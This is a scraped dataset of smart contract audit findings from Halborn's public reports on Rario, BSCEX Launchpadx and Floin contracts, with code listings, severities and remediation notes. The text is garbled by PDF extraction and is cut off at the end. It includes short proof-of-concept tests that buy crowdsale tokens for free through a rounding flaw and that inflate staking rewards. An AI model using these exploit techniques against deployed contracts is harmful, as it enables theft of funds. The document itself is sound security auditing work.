"html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The contract RarioPolygonNFT, as per the documentation, contains the functions deposit, withdraw and mint. The mint function is inherited from RarioNFT and contains the following code: Listing 6: RarioNFT.sol - mint 39 function mint ( address to , uint256 tokenId ) external virtual { 40 41 42 } _checkRole ( OPERATOR , msgSender () ); _mint (to , tokenId ); The function does not verify if the token was withdrawn previously as it is done in ChildMintableERC721.sol: Listing 7: ChildMintableERC721.sol - mint (Lines 2268,2273) 2264 /* * 2265 * @notice Example function to handle minting tokens on matic chain 2266 2267 * @dev Minting can be done as per requirement , * This implementation allows only admin to mint tokens but it can be changed as per requirement 2268 * Should verify if token is withdrawn by checking ` withdrawnTokens ` mapping * @param user user for whom tokens are being minted * @param tokenId tokenId to mint */ 2269 2270 2271 2272 function mint ( address user , uint256 tokenId ) public only ( 2273 DEFAULT_ADMIN_ROLE ) { require (! withdrawnTokens [ tokenId ], \" ChildMintableERC721 : TOKEN_EXISTS_ON_ROOT_CHAIN \"); 26 2274 2275 } _mint ( user , tokenId ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check in RarioPolygonNFT if the token was withdrawn before minting. Remediation Plan: SOLVED: Rario team modified the mint function in RarioPolygonNFT. Now the function checks if the token was withdrawn before minting: Listing 8: RarioPolygonNFT.sol - mint (Lines 34) 32 function mint ( address user , uint256 tokenId ) external override { 33 34 _checkRole ( OPERATOR , _msgSender () ); require (! withdrawnTokens [ tokenId ], \" ChildMintableERC721 : TOKEN_EXISTS_ON_ROOT_CHAIN \"); _mint ( user , tokenId ); 35 36 } 27 ", "labels": ["Halborn", "Rario", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the contract Marketplace.sol there are functions marked as public but they are never directly called within the same contract or in any of its descendants: Marketplace.sol - getPendingWithdrawal(address) (Marketplace.sol#387-389) - withdraw() (Marketplace.sol#394-396) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external to save gas. Remediation Plan: SOLVED: Rario team declared those functions as external. 28 ", "labels": ["Halborn", "Rario", "Severity: Informational"]}, {"title": "UNUSED CONSTANTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following constants are not used anywhere in the code. Code Location: Listing 9: ERC721NFT.sol 30 string internal constant E_NFT_TRANSFER_TO_NON_RECEIVER = \" E03001 \" ; Listing 10: Marketplace.sol 57 string private constant ERR_CURRENCY_MANAGER = \" NFTMarketplace : Error in CurrencyManager \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Check whether these constants should be used and if not remove them in order to save gas. Remediation Plan: SOLVED: Rario team removed these unused constants. 29 ", "labels": ["Halborn", "Rario", "Severity: Informational"]}, {"title": "UNUSED EVENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The following events are declared but they are not emitted by any function: Listing 11: MetadataDB.sol 105 event TokenStringValueUpdated ( uint256 indexed tokenId , string indexed attribute , string value ); 106 event TokenNumberValueUpdated ( uint256 indexed tokenId , string indexed attribute , int256 value ); 107 event TokenBooleanValueUpdated ( uint256 indexed tokenId , string indexed attribute , bool value ); Listing 12: Marketplace.sol 140 event WithdrawPending ( address indexed user , uint256 amount ); Listing 13: CurrencyManager.sol 97 event BaseCurrencyUpdated ( string indexed symbol ); Listing 14: MarketplaceConfig.sol 49 event TokenPriceFeedUpdated ( address indexed newAddress , address indexed oldAddress , string symbol ); Risk Level: Likelihood - 1 Impact - 1 30 Recommendation: Check whether these events should be used and if not remove them. Remediation Plan: SOLVED: Rario team removed all the unused events from their smart contracts. 31 MANUAL TESTING 32 4.1 INTRODUCTION Halborn performed different manual tests in all the contracts trying to find logic flaws and vulnerabilities that were not detected by the automatic tools. During the manual testing multiple questions were considered while evaluating each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can a function be called twice in the same block causing issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation. . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? G N I T S E T L A U N A M 33 4.2 UPGRADEABLE CONTRACTS ARCHITECTURE As our first test, architecture was correct. Upgradeable: we validated that the upgradeable contracts This is the hierarchy of the contract 1. ERC1967Upgrade: This abstract contract provides getters and event emitting update functions for EIP1967 slots. 2. ERC1822UUPS: Inherits from ERC1967Upgrade. This contract is used as an upgradeability mechanism designed for UUPS proxies. Correctly initializes ERC1967Upgrade: Listing 15: ERC1822UUPS.sol - initializeERC1822UUPS (Lines 22) 21 function initializeERC1822UUPS () internal initializer { 22 23 } initializeERC1967Upgrade () ; 3. Upgradeable: Inherits from ERC1822UUPS, Constants, Initializable, AccessRoles and Pausable. Correctly initializes all of its parent contracts: Listing 16: Upgradeable.sol - initializeUpgradeable 16 function initializeUpgradeable ( address trustedForwarder ) internal initializer { setTrustedForwarder ( trustedForwarder ); initializeAccessControl () ; initializePausable () ; initializeERC1822UUPS () ; _setupRole ( DEFAULT_ADMIN_ROLE , msgSender () ); _setupRole ( SUPER_RARIO , msgSender () ); _setupRole ( RARIO_ADMIN , msgSender () ); _setupRole ( OPERATOR , msgSender () ); 17 18 19 20 21 22 23 24 25 26 } 34 G N I T S E T L A U N A M Moreover, it overrides ERC1822UUPS._authorizeUpgrade function, adding the modifier whenPaused and checking that msgSender() has SUPER_RARIO role. This way the contract will only be able to be upgraded by members of the SUPER_RARIO group and only if the contract is paused. Listing 17: Upgradeable.sol - authorizeUpgrade 43 function _authorizeUpgrade ( address ) internal view override whenPaused { _checkRole ( SUPER_RARIO , msgSender () ); 44 45 } G N I T S E T L A U N A M 35 4.3 CONTRACTS INITIALIZATION No issues found on the initialization. Although: 1. CurrencyManager, ERC721NFT, MarketplaceConfig and RarioEthereumNFT init functions should be kept as internal as they are missing the initializer modifier. 2. We recommend calling initializeReentrancyGuard() in the contract Marketplace initializeMarketplace function. G N I T S E T L A U N A M 36 G N I T S E T L A U N A M 37 4.4 RARIOCURRENCYMANAGER CONTRACT This The contract RarioCurrencyManager inherits from CurrencyManager. contract is used to store all the different attributes related to the tokens. The contract contains the following functions:  From CurrencyManager  _addCurrency(CurrencyManager.CurrencyType,string,address, uint8) (private)  _convert(string,string,uint256) (private)  _getCurrency(string) (private)  _getCurrencyPair(string) (private)  _memcmp(bytes,bytes) (internal)  _removeCurrency(string) (private)  _removeCurrencyPair(string) (private)  _setFiatDecimals(uint8) (private)  _strcmp(string,string) (internal)  addCryptoCurrency(string,address,uint8) (external)  addCurrencyPair(string,string,string,bool,uint8,address) (external)  addFiatCurrency(string) (external)  convert(string,string,uint256) (external)  getCurrency(string) (external)  getCurrencyByIndex(uint256) (external)  getCurrencyPair(string) (external)  getCurrencyPairByIndex(uint256) (external)  getFiatDecimals() (external)  getNativeCurrency() (external)  initializeCurrencyManager(string) (internal)  removeCurrency(string) (external)  removeCurrencyPair(string) (external)  setFiatDecimals(uint8) (external)  supportedCurrencies() (external)  supportedCurrencyPairs() (external) G N I T S E T L A U N A M 38  supportsCurrency(string) (external)  supportsCurrencyPair(string) (external)  totalSupportedCurrencies() (external)  totalSupportedCurrencyPairs() (external)  From RarioCurrencyManager  initialize(address,string) (external) As this contract was really simple our manual tests focused on checking that all the getter and setter functions were working as expected: The setter functions can only be called by RARIO_ADMIN. The getter functions can be called by anyone, except getFiatDecimals() which can only be called by OPERATORS. G N I T S E T L A U N A M 39 4.5 RARIODATA CONTRACT The contract RarioData inherits from MetadataDB. This contract is used to store all the different attributes related to the tokens. The contract contains the following functions:  From MetadataDB  _canSetValue(uint256,string) (private)  _getAttribute(string) (private)  addAttribute(string,string,MetadataDB.AttributeType,bool) (external)  depricate(string) (external)  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getBooleanValue(uint256,string) (external)  getNumberValue(uint256,string) (external)  getTextValue(uint256,string) (external)  setBooleanValue(uint256,string,bool) (external)  setDescription(string,string) (external)  setNumberValue(uint256,string,int256) (external)  setTextValue(uint256,string,string) (external)  From RarioData  initialize(address) (external) All the setter functions in this contract can only be called by users with the OPERATOR role except the function existsAttribute(string) which can be called by anyone. On the other hand, the setter functions can only be called by users with the RARIO_ADMIN role. We can see below how the different getter and setter functions are working as expected and also how they are restricted with the right access control policies: 40 G N I T S E T L A U N A M G N I T S E T L A U N A M 41 4.6 RARIOMARKETPLACE CONTRACT The contract RarioMarketplace inherits from Marketplace. The contract contains the following functions:  From Marketplace  _cancelListing(uint256) (private)  _createListing(uint256,uint256,string,address,address,address ,uint8) (private)  _distributeFunds(address,string,uint256) (private)  _finaliseListing(uint256) (private)  _getListingByListingId(uint256,bool) (private)  _isValidWallet(address) (private)  _reloadConfiguration() (private)  _sendValue(address,uint256,uint256) (private)  _transferToken(address,address,uint256) (private)  cancelListing(uint256) (external)  createAuction(uint256,uint256,string,address) (external)  createPrivateSale(uint256,uint256,string,address,address) (external)  createPublicSale(uint256,uint256,string,address) (external)  finalizeListing(uint256) (external)  getBidPriceInCurrency(uint256,string) (external)  getFinalisedListing(uint256) (external)  getListing(uint256) (external)  getListingByTokenId(uint256) (external)  getPendingWithdrawal(address) (public)  initializeMarketplace(address,address) (internal)  placeBid(uint256,address,string,uint256) (external)  reloadConfiguration() (external)  setMarketplaceConfig(address) (external)  updateListing(uint256,uint256) (external)  withdraw() (public)  withdrawFor(address) (public)  From RarioMarketplace 42 G N I T S E T L A U N A M  initialize(address,address,address) (external) Test 1: Creating a public sale Initially, the price set was 1337. In this test, user1 created a public sale by calling the createPublicSale But then user1 called function. updateListing and updated the price to 3000 USD. Then, user2 bought the token successfully by calling the placeBid function. In the image below, we can see how the 95% of the tokens were transferred to user1 and the 5% to the treasury address: G N I T S E T L A U N A M On the other hand, it is worth mentioning that the parameter bidValue is useless as long as the user calling placeBid is providing a msg.value > 0: Listing 18: Marketplace.sol (Lines 308,310) 297 function placeBid ( 298 299 300 301 uint256 listingId , address buyerTokenWallet , string calldata currency , uint256 bidValue 43 302 ) external payable { 303 304 305 Listing storage listing = _listings [ listingId ]; require ( listing . price > 0, ERR_LISTING_NOT_EXISTS ); require ( listing . sellerTokenWallet != buyerTokenWallet , 306 307 308 309 310 311 ERR_CANNOT_BUY_OWN_LISTING ); require ( _isValidWallet ( buyerTokenWallet ) , ERR_UNSUPPORTED_TOKEN_WALLET ); if ( msg . value > 0) { require ( currency . equals ( _nativeCurrency ) , \" NFTMarketplace : Currency Symbol is not Native currency \"); bidValue = msg . value ; } The payment can also be done with an ERC20 token, in this case, with USDC ERC20 tokens: G N I T S E T L A U N A M 44 Test 2: Creating a private sale this user1 test, the In created The price createPrivateSale function setting the user2 as the buyer. set was 3000. Then, user2 bought the token successfully by calling the placeBid function: calling private sale by a We can see how the sale is restricted just for the user2: G N I T S E T L A U N A M 45 Test 3: Creating an auction, payment with NATIVE currency function. In this test, user1 created an auction sale by calling the createAuction But then user1 called updateListing and updated the price to 5000 USD. Then multiple users placed a bid using NATIVE currency: Initially the price set was 3000. In the image above we can appreciate how the ETH amount was discounted from their balance and sent to the smart contract right after placing the highest bid. We can also see how the bid was returned also to the outbid users. We have also made sure that the seller cannot place any bid in his listing: G N I T S E T L A U N A M 46 G N I T S E T L A U N A M 47 Test 4: Creating an auction, payment with TOKEN currency Initially, the price set was 3000. In this test, user1 created an auction sale by calling the createAuction But then user1 called function. updateListing and updated the price to 5000 USD. Then multiple users placed a bid using TOKEN currency. 2 different issues were found which are explained in:  INCORRECT LOGIC LEADS TO DOS IN AUCTION SALES  OUTBID USER DOES NOT RECEIVE BACK HIS FUNDS G N I T S E T L A U N A M 48 4.7 RARIOMARKETPLACECONFIG CONTRACT The contract RarioMarketplaceConfig inherits from MarketplaceConfig and is used to configure different parameters used by the RarioMarketplace contract. The contract RarioMarketplaceConfig contains the following functions:  From MarketplaceConfig  _existsUserWallet(address) (internal)  _setAllowExternalWallets(bool) (private)  _setAuctionExtensionDuration(uint256) (private)  _setAuctionPercentIncrementInBasisPoints(uint256) (private)  _setGasLimits(uint256,uint256,uint256) (private)  _setListingExpiry(uint256) (private)  _setPlatformFees(uint256) (private)  _setTokenContract(address) (private)  _setTreasury(address) (private)  _setUserDB(address) (private)  getAllowExternalWallets() (external)  getAuctionExtensionDuration() (external)  getAuctionPercentIncrementInBasisPoints() (external)  getGasLimits() (external)  getListingExpiry() (external)  getPlatformFees() (external)  getTokenAddress() (external)  getTreasuryAddress() (external)  getUserDBAddress() (external)  initializeMarketplaceConfig(address,address,address) (internal)  isValidWallet(address) (external)  setAllowExternalWallets(bool) (external)  setAuctionExtensionDuration(uint256) (external)  setAuctionPercentIncrementInBasisPoints(uint256) (external)  setGasLimits(uint256,uint256,uint256) (external)  setListingExpiry(uint256) (external) 49 G N I T S E T L A U N A M  setPlatformFees(uint256) (external)  setTokenAddress(address) (external)  setTreasuryAddress(address) (external)  setUserDBAddress(address) (external)  From RarioMarketplaceConfig  initialize(address,address,address,address) (external) Test: setAllowExternalWallets - True, setPlatformFees - 5000 (50%) this In test, MarketplaceConfig contract: have we set the following configuration in the  marketplaceConfig.setAllowExternalWallets(True, {'from': owner})  marketplaceConfig.setPlatformFees(5000, {'from': owner}) Below we can see, how the platform fee is now 50% as the 50% of the payment goes to the treasury address. On the other hand, we can also see how external wallets are allowed to bid without having added them previously in the RarioUsers contract: G N I T S E T L A U N A M 50 4.8 RARIOPOLYGONTOKEN CONTRACT contract The RarioPolygonNFT at the same time inherits from RarioNFT contract. RarioPolygonToken inherits from RarioPolygonNFT. The contract RarioPolygonToken contains the following functions:  From RarioPolygonNFT  deposit(address,bytes) (external)  encodeTokenMetadata(uint256) (external)  initializeRarioPolygonNFT(string,string,address,address) (internal)  withdraw(uint256) (external)  withdrawBatch(uint256[]) (external)  withdrawWithMetadata(uint256) (external)  From RarioNFT  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeBooleanValue(uint256,string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getAttributeNumberValue(uint256,string) (external)  getAttributeTextValue(uint256,string) (external)  initializeRarioNFT(string,string,address) (internal)  isApprovedForAll(address,address) (public)  isContractApprovedForAll(address) (external)  mint(address,uint256) (external)  safeMint(address,uint256) (external)  safeMint(address,uint256,bytes) (external)  setContractApprovalForAll(address,bool) (external)  From RarioPolygonToken  initialize(address,address,address,string,string) (external) The contract RarioPolygonNFT correctly follows the Polygon Mintable Assets documentation: 51 G N I T S E T L A U N A M 1. The contract RarioPolygonNFT has the same structure as ChildMintableERC721.sol 2. The RarioPolygonNFT contract withdraw and mint. RarioNFT contract and can only be called by an OPERATOR. deposit, the The mint function is inherited, though, from functions contains Listing 19: RarioNFT.sol (Lines 40) 39 40 41 42 function mint ( address to , uint256 tokenId ) external virtual { _checkRole ( OPERATOR , msgSender () ); _mint ( to , tokenId ); } is worth mentioning, MINT FUNCTION IN It page RARIOPOLYGONNFT DOES NOT VERIFY IF TOKEN WAS WITHDRAWN that the function mint in RarioPolygonNFT does not verify if the token was withdrawn previously as it is done in ChildMintableERC721.sol described findings the in as G N I T S E T L A U N A M 52 4.9 RARIOETHEREUMTOKEN CONTRACT contract The RarioEthereumNFT at the same time inherits from RarioNFT contract. RarioEthereumToken inherits from RarioEthereumNFT. The contract RarioEthereumToken contains the following functions:  From RarioEthereumNFT  exists(uint256) (external)  initializeRarioEthereumNFT(string,string,address,address) (internal)  mint(address,uint256) (external)  mint(address,uint256,bytes) (external)  setTokenMetadata(uint256,bytes) (internal)  version() (external)  From RarioNFT  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeBooleanValue(uint256,string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getAttributeNumberValue(uint256,string) (external)  getAttributeTextValue(uint256,string) (external)  initializeRarioNFT(string,string,address) (internal)  isApprovedForAll(address,address) (public)  isContractApprovedForAll(address) (external)  safeMint(address,uint256) (external)  safeMint(address,uint256,bytes) (external)  setContractApprovalForAll(address,bool) (external)  From RarioEthereumToken  initialize(address,address,address,string,string) (external) The contract RarioEthereumNFT correctly follows the Polygon Mintable Assets documentation: 53 G N I T S E T L A U N A M 1. The contract RarioEthereumNFT has the same structure as DummyMintableERC721.sol G N I T S E T L A U N A M 54 4.10 RARIOUSERS CONTRACT The contract RarioUsers inherits from UserDB. This contract is used like a database to keep control of all the users and wallets. The contract RarioUsers contains the following functions which are all only callable by the OPERATOR role:  From UserDB  addUser(uint256,address) (external)  existsUserId(uint256) (external)  existsUserWallet(address) (external)  getUserByAddress(address) (external)  getUserById(uint256) (external)  getUserByIndex(uint256) (external)  getUserCount() (external)  updateUser(uint256,address) (external)  From RarioUsers  initialize(address) (external) G N I T S E T L A U N A M All the functions are working as expected as can be seen above except updateUser which is not validating if the address of the wallet was 55 already added, as described in the findings page UPDATEUSER FUNCTION MISSING REQUIRE STATEMENT. G N I T S E T L A U N A M 56 ", "labels": ["Halborn", "Rario", "Severity: Informational"]}, {"title": "3.1 MISSING ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf", "body": "Address validation at many places in contracts LaunchpadxIDO.sol and LaunchpadxFactory.sol. Lack of zero address validation has been found at many instances when assigning user supplied address values to state variables directly. Recommendation: Add proper address validation when every state variable assignment done from user supplied input. Code Location: LaunchpadxFactory.sol: Line #14 Line #22 LaunchpadxIDO.sol: Line #80 Line #81 Line #82 Line #83 Line #103 8 Line #107 ", "labels": ["Halborn", "BSCEX_Launchpadx_SmartContract", "Severity: Low"]}, {"title": "are being ig", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract LaunchpadxIDO.sol, there are few instances where external methods are being called and return value(bool) are being ig- nored. Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. 9 Code Location: LaunchpadxIDO.sol: Ignoring boolean return type Line #208 Line #231 Line #237 ", "labels": ["Halborn", "BSCEX_Launchpadx_SmartContract", "Severity: Informational"]}, {"title": "scoped been has run the all on 10 11 MythX: LaunchpadxFactory.sol LauncpadxIDO.sol 12 LaunchpadxTicket.sol 13 THANK YOU FOR CHOOSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpadx_SmartContract_Report_Halborn_v1.pdf", "body": "and MythX Slither con- tracts(LaunchpadxTicket.sol, LaunchpadxFactory.sol and LaunchpadxIDO. sol) scoped been has run the all on 10 11 MythX: LaunchpadxFactory.sol LauncpadxIDO.sol 12 LaunchpadxTicket.sol 13 THANK YOU FOR CHOOSING", "labels": ["Halborn", "BSCEX_Launchpadx_SmartContract", "Severity: Informational"]}, {"title": "ANY USER CAN PURCHASE CROWDSALE TOKENS FOR FREE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Crowdsale contract enables swapping payment token for purchasable tokens. The amount of tokens to be paid is calculated with the following formula when calling the buyTokens() function: Listing 1: Price Formula 1 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; The problem is, the payment can return zero if (tokens * price * uint256( usdPrice)) is less than (10 ** priceFeedDecimals / 10 ** tokenDecimals). Therefore, any user can purchase crowdsale tokens for free as they find an optimal value for tokens variable. Proof of Concept: Listing 2: Crowdsale.t.sol - Test Case uint256 preFltkBalance = floinToken . balanceOf ( user1 ); uint256 preUsdtBalance = mockUSDT . balanceOf ( user1 ); vm . startPrank ( user1 ); uint256 allowedBalance = 1 e18 ; mockUSDT . approve ( address ( crowdsale ) , allowedBalance ); 1 function testFail_crowdsaleBuyTokensForFreePoC () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 crowdsale . buyTokens (2 e13 , user1 ); unchecked { ++ i ; for ( uint i ; i < 5000; ) { } } 16 15 16 17 18 19 20 21 } uint256 postFltkBalance = floinToken . balanceOf ( user1 ); uint256 postUsdtBalance = mockUSDT . balanceOf ( user1 ); assertGt ( postFltkBalance - preFltkBalance , 0) ; assertLt ( postUsdtBalance , preUsdtBalance ); Screenshots: Code Location: Listing 3: Crowdsale.sol (Lines 116,126) 109 function buyTokens ( uint256 tokens , address recipient ) public  whenNotPaused onlyWhileOpen { 110 require ( msg . sender == recipient || initiatorWhitelist [ msg .  sender ], \" Crowdsale :: buyTokens : Not allowed .\" ); 111 require ( tokens > 0, \" Crowdsale :: buyTokens : tokens cannot be 0 \"  ); 112 113 114 int256 usdPrice = getLatestPrice () ; require ( usdPrice > 0, \" Crowdsale :: buyTokens : negative usd  price \" ); 115 116 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; 117 118 uint256 allowance = paymentToken . allowance ( msg . sender , address  ( this )); 17 119 require ( allowance >= payment , \" Crowdsale :: buyTokens : Allowance  too low \" ); 120 121 122 uint256 remaining = remainingTokens () ; require ( remaining >= tokens , \" Crowdsale :: buyTokens : Not enough  tokens left \"); 123 124 125 126 paymentRaised += payment ; paymentToken . safeTransferFrom ( msg . sender , paymentCollector ,  payment ); 127 128 129 130 } token . safeTransferFrom ( tokenWallet , recipient , tokens ); emit TokenPurchase ( msg . sender , recipient , payment , tokens ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: Consider correcting the price formula by taking decimals of token and price feed into account. Remediation Plan: SOLVED: The Floin team solved the issue by introducing the new payment calculation function (getPayment()) into their code. Commit ID: 822726a467a789a621736790b4cf44e2e62a48c9 18 ", "labels": ["Halborn", "Floin_Floins", "Severity: Critical"]}, {"title": "REWARD MODIFICATION LEADS TO REWARDS INFLATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The Staking contract implements a rewarding feature to help to distribute extra rewards to protocol users. The reward speed parameter is set inside the constructor when deploying the contract. The contract owner can modify rewarding parameters by calling the set() function. However, the set() function tries to update pool rewards, since it also calls the updatePoolRewards() function. Therefore, rewards are miscal- culated, and all stake owners get inflated rewards. Proof of Concept: Listing 4: FLTKStaking.t.sol - Test Case vm . startPrank ( user1 ); uint256 [] memory depositIds = new uint256 [](2) ; stakingToken . increaseAllowance ( address ( fltkStaking ) , 3 e18 ); depositIds [0] = fltkStaking . deposit (1) ; skip (1001) ; depositIds [1] = fltkStaking . deposit (2 e18 ); // fltkStaking . claimRewards ( depositIds ) ; // 1001 uint256 calculatedReward = fltkStaking . pendingRewardForUser ( 1 function testFail_miscalculatedRewardsSetFunctionPoC () public { 2 3 4 5 6 7 8 9  depositIds , user1 ); 10 vm . stopPrank () ; 11 12 13 14 15 16 17 18 19 20 } vm . prank ( deployer ); fltkStaking . set (0 , 1 , 1 e3 ); skip (1) ; vm . prank ( user1 ); fltkStaking . claimRewards ( depositIds ); // 1001000 uint256 finalRewardBalance = rewardToken . balanceOf ( user1 ); assertEq ( finalRewardBalance , calculatedReward ); 19 Screenshots: Code Location: Listing 5: FLTKStaking.sol (Line 358) 351 function set ( uint256 _rewardsPerSecond , uint256 _depositBucketSize  , uint256 _rewardSlashingInterval ) 352 public 353 onlyOwner 354 { 355 require ( _depositBucketSize > 0, \" FLTKStaking :: set : Deposit  bucket size has to be greater than 0\" ); 356 require ( _rewardSlashingInterval > 0, \" FLTKStaking :: set : Reward  slashing interval has to greater than 0 \"); 357 358 359 360 361 362 } updatePoolRewards () ; rewardsPerSecond = _rewardsPerSecond ; depositBucketSize = _depositBucketSize ; rewardSlashingInterval = _rewardSlashingInterval ; Risk Level: Likelihood - 4 Impact - 4 20 Recommendation: Consider correcting the updatePoolRewards() function for set() call since it inflates rewards. Remediation Plan: NOT APPLICABLE: This finding is not applicable, as the test scenario in the Proof of Concept section describes that the _rewardSlashingInterval variable is decreasing from 1e6 to 1e3. According to the reward formula, the denumerator will be less than the previous value. In this case, more rewards are expected as a result. 21 ", "labels": ["Halborn", "Floin_Floins", "Severity: High"]}, {"title": "FIXED PRICE FOR EUR/USD PAIR CAN AFFECT CROWDSALE TOKEN PRICES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The payment calculation formula of Crowdsale contract uses fixed price for EUR/USD pair. The price variable represents the price of EUR/USD but this variable is immutable. It means the price will be defined during contract deployment. The problem is EUR/USD price can change over time. If Euro loses value against United States Dollar, then, users will get less Crowdsale tokens than they should have. Proof of Concept: Before Value Loss: Listing 6: EUR/USD prices before value loss 1 Chainlink Oracle EUR / USD price : 106690000 2 Chainlink Oracle USDC / USD price : 98991589 3 Floin Fixed EUR / USD price : 106690000 Alice decides to buy 200_000_000_000 Crowdsale FLTK tokens:  (200_000_000_000 * 106690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice will get 200_000_000_000 FLTK Crowdsale Tokens for 21. 22 After Value Loss: Listing 7: EUR/USD prices after value loss 1 Chainlink Oracle EUR / USD price : 96690000 2 Chainlink Oracle USDC / USD price : 98991589 3 Floin Fixed EUR / USD price : 106690000 Alice buys 200_000_000_000 Crowdsale FLTK tokens:  (200_000_000_000 * 106690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice will get 200_000_000_000 FLTK Crowdsale Tokens for 21.  However, actual price calculation should have been:  (200_000_000_000 * 96690000 * 98991589)/ (10**8)/ (10**18)  As a result, Alice should have get 200_000_000_000 FLTK Crowd- sale Tokens for 19. Code Location: Listing 8: Crowdsale.sol (Line 102) address _paymentCollector , address _tokenWallet , address _priceFeed , ERC20 _token , ERC20 _paymentToken , uint256 _price , uint256 _openingTime , uint256 _closingTime 84 constructor ( 85 86 87 88 89 90 91 92 93 ) { 94 95 96 97  ; 98 99 100 if ( _paymentCollector == address (0) ) revert AddressZero () ; if ( _tokenWallet == address (0) ) revert AddressZero () ; if ( address ( _token ) == address (0) ) revert AddressZero () ; if ( address ( _paymentToken ) == address (0) ) revert AddressZero () if ( _priceFeed == address (0) ) revert AddressZero () ; if ( _price == 0) revert InvalidPrice () ; if ( _closingTime <= block . timestamp ) revert InvalidClosingTime 23  () ; 101 102 price = _price ; Listing 9: Crowdsale.sol (Line 131) 131 uint256 payment = tokens * price * uint256 ( usdPrice ) / 10 **  priceFeedDecimals / 10 ** tokenDecimals ; Risk Level: Likelihood - 3 Impact - 3 Recommendation: In order not to be affected by this vulnerability, the instant value of this specific pair can be fetched over price oracles and this value can be used in the code. Remediation Plan: SOLVED: The Floin team solved the issue by introducing the new payment calculation function (getPayment()) into their code. The contract will get the EUR/USD price information from Chainlink Price Oracle with this new change. Commit ID: 822726a467a789a621736790b4cf44e2e62a48c9 24 ", "labels": ["Halborn", "Floin_Floins", "Severity: Medium"]}, {"title": "MISCALCULATION OF DEPOSIT ID", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In the FLTKStaking.sol contract, when a user tries to stake their assets by calling the deposit function, that function calculates deposit ID with the following formula: Listing 10: Deposit ID Calculation Formula 1 uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; Division before multiplication is used in the formula above. Therefore, there is a precision loss and userDepositId might be miscalculated. Proof of Concept: 1. Assume that depositBucketSize variable is 100. 2. Assume that block.timestamp is 1677687861. 3. The calculation will return 1677687800 as depositId. However, if we try to execute the multiplication before division, it was going to return 1677687861 which is the correct time. Screenshots: 25 Code Location: Listing 11: FLTKStaking.sol (Line 152) 148 function deposit ( uint256 _amount ) public returns ( uint256 ) { 149 require ( _amount > 0, \" FLTKStaking :: deposit : Amount cannot be 0  \" ); 150 151 152 address _userAddress = _getUser () ; uint256 userDepositId = block . timestamp / depositBucketSize *  depositBucketSize ; 153 UserDeposit storage user = userDeposit [ _userAddress ][  userDepositId ]; 154 155 uint256 [] memory _depositIds = new uint256 [](1) ; _depositIds [0] = userDepositId ; Risk Level: Likelihood - 4 Impact - 2 Recommendation: Consider executing the multiplication before the division operation to prevent miscalculating deposit IDs. Remediation Plan: NOT APPLICABLE: At the end of the discussion with the Floin team, it was decided that this finding was not a vulnerability, but an intentional The loss of precision here is intentionally done to include design. depositors in the same group. 26 ", "labels": ["Halborn", "Floin_Floins", "Severity: Medium"]}, {"title": "DEPOSITFOR FUNCTION USES A DANGEROUS MODIFIER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Floin_Floin_Smart_Contracts_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The depositFor function uses a risky impersonateUser modifier to deposit on behalf of another user. If someone gives allowance to the FLTKStaking contract, any other user can spend these allowances by calling the depositFor function by providing a depositor address. An example scenario: 1. Alice decides to stake 10e18 Staking Tokens on 